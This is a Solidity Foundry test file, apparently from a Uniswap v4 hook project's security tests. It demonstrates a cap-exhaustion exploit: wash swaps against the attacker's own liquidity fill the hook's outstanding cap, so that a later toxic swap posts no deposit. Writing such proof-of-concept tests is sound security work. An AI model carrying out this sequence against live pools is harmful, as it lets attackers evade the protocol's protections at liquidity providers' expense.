// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {ModifyLiquidityParams} from "v4-core/types/PoolOperation.sol";
import {TouchstoneFixture} from "ts/test/utils/TouchstoneFixture.sol";
import {Record} from "ts/src/types/Record.sol";
import {PoolState} from "ts/src/types/PoolState.sol";

/// Wash round trips against the attacker's own concentrated liquidity fill maxOutstanding, after which
/// a toxic swap posts no deposit at all. The wash deposits are refunded at settlement.
contract CapExhaustionTest is TouchstoneFixture {
    using StateLibrary for IPoolManager;

    address attacker = makeAddr("attacker");

    function setUp() public {
        _setUp(18, 6);
        _fund(attacker);
    }

    function _deposits() internal returns (uint256 n) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == DepositTaken.selector && logs[i].emitter == address(hook)) ++n;
        }
    }

    function test_ControlArbPostsDeposit() public {
        vm.roll(block.number + 1);
        vm.recordLogs();
        _swap(attacker, true, true, 400_000 * 10 ** decQuote, "");
        assertEq(_deposits(), 1);
    }

    function test_FillCapThenArbPostsNothing() public {
        (, int24 tick,,) = manager.getSlot0(id);
        int24 lower = (tick / TICK_SPACING) * TICK_SPACING;
        ModifyLiquidityParams memory lp = ModifyLiquidityParams({
            tickLower: lower - TICK_SPACING, tickUpper: lower + 2 * TICK_SPACING,
            liquidityDelta: int256(uint256(liquidity()) * 40_000), salt: bytes32("jit")
        });
        vm.prank(attacker, attacker);
        lpRouter.modifyLiquidity(key, lp, "");

        vm.roll(block.number + 1);
        uint256 legs;
        uint256[6] memory sizes = [uint256(100_000_000), 30_000_000, 10_000_000, 3_000_000, 1_000_000, 300_000];
        for (uint256 k; k < sizes.length; ++k) {
            for (uint256 i; i < 3; ++i) {
                uint256 rb = _balance(risky, attacker);
                _swap(attacker, true, true, sizes[k] * 10 ** decQuote, "");
                _swap(attacker, false, true, _balance(risky, attacker) - rb, "");
                legs += 2;
            }
        }
        console2.log("wash legs", legs);
        PoolState memory st = hook.poolState(id);
        console2.log("outstanding0/1", st.outstanding0, st.outstanding1);

        lp.liquidityDelta = -lp.liquidityDelta;
        vm.prank(attacker, attacker);
        lpRouter.modifyLiquidity(key, lp, "");

        vm.recordLogs();
        _swap(attacker, true, true, 400_000 * 10 ** decQuote, "");
        assertEq(_deposits(), 0, "toxic swap posted no deposit");
    }
}
